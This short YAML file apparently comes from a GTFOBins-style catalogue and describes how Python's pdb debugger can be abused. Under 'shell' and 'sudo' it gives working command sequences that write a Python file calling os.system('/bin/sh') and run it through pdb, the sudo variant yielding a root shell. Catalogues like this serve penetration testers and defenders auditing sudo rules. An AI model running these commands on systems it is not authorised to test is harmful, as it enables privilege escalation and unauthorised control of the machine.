---
functions:
  shell:
    - code: |
        TF=$(mktemp -d)
        echo 'import os; os.system("/bin/sh")' > $TF/x
        pdb $TF/x
        cont
  sudo:
    - code: |
        TF=$(mktemp -d)
        echo 'import os; os.system("/bin/sh")' > $TF/x
        sudo pdb $TF/x
        cont
---
